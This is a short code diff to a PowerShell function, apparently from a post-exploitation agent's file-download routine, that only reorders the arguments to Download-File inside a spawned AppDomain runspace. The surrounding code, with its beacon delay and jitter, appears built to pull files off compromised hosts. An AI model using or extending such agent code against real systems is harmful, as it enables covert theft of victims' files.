@@ -546,7 +546,7 @@ function Get-FilePart {
         $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create()
 
         # add the target script into the new runspace/appdomain
-        $ScriptBlock = "$ScriptBlock`nDownload-File -type $Type -FilePath $FilePath -ResultID $ResultID -ChunkSize $ChunkSize -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
+        $ScriptBlock = "$ScriptBlock`nDownload-File -type $Type -FilePath $FilePath -ChunkSize $ChunkSize -ResultID $ResultID -Delay $($script:AgentDelay) -Jitter $($script:AgentJitter)"
         $null = $PSHost.AddScript($ScriptBlock)
 
         # stupid v2 compatibility...
